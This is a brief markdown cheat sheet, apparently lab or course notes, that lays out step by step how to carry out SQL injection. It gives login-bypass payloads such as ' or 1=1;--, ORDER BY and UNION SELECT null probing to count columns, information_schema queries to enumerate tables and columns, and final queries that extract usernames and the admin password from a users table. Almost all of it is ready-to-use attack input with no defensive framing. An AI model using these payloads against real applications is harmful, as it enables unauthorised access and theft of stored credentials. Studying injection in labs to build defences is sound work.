## Steps to Follow for SQL Injection  
  
1. First try to find whether or not we can escape using ' in string fields during queries.
    Try `' or 1=1'` or `admin' or 1=1;--` and other such similar things.  

1. Here, we need to escape the passwords/ strings closing quote `'`  
    Either do `' or 1=1'`, extra quote at end to compensate the string quote.       
    Or try `' or 1=1;--` use comments to escape.   
    Or try `' or 1-1 #` use hash to escape.   
1. Determine number of rows of query by   
    `order by 1-- # `,     
    `order by 2-- #`
1. Now, find number null columns by using.    
    `union select null, .... or '`,  
    `union select null, null, .. or '`,  
1. Guess schema name using information_schema.tables.   
    Try guess table_schema, table_name.   

    1. `123' union select table_schema from information_schema.tables #`
    1. `123' union select table_name from information_schema.tables where table_schema = 'isaa_db' #`   

    Get attribute names

    1. ```sql
        123' union select column_name from information_schema.columns where table_schema = 'isaa_db' and table_name = 'users' #
        ```

    1. Now, we have field names try and guess users and passwords.   
        1. `123' union select username from users order by username #`
        1. `123' union select password from users where username='admin' #`
1. Guess table or try to union select table name from information_schema.tables.
1. Now, try to use union select to get other atttributes
    `union select <guess attribute name>>`